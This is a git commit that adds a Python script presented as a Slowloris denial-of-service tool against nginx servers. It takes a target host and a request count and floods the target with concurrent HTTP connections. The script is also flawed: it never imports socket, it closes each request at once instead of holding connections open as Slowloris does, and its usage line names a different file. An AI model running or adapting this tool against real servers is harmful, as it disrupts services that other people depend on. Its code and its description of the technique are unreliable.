88d7859bc46e27c95e1813888124fa52b4101f28
Aung Myat Thu <zenzue1337@gmail.com>
2023-02-24 18:56:18 +0630

    Slowloris attack dos tool for nginx

---
+++ nginx_dos.py
@@ -0,0 +1,39 @@
+import asyncio
+import random
+import time
+import sys
+import argparse
+
+async def attack(url):
+    reader, writer = await asyncio.open_connection(
+        url, 80, ssl=None, family=socket.AF_INET)
+    writer.write(b"GET / HTTP/1.1\r\n")
+    writer.write(b"Host: " + url.encode() + b"\r\n")
+    writer.write(b"User-Agent: " + str(random.randint(1,10000)).encode() + b"\r\n")
+    writer.write(b"Accept-Encoding: gzip, deflate\r\n")
+    writer.write(b"Connection: keep-alive\r\n\r\n")
+    await writer.drain()
+    writer.close()
+    await writer.wait_closed()
+
+async def main(url, requests):
+    tasks = []
+    for i in range(requests):
+        tasks.append(attack(url))
+    await asyncio.gather(*tasks)
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='DDoS test tool. by w01f @xai_yak')
+    parser.add_argument('url', help='Target URL')
+    parser.add_argument('requests', type=int, help='Number of requests to send')
+    args = parser.parse_args()
+
+    try:
+        print(f"Sending {args.requests} requests to {args.url}")
+        start_time = time.time()
+        asyncio.run(main(args.url, args.requests))
+        print(f"Requests completed in {time.time() - start_time:.2f} seconds")
+    except KeyboardInterrupt:
+        print("Interrupted")
+        sys.exit(1)
+# python goloris.py example.com 1000
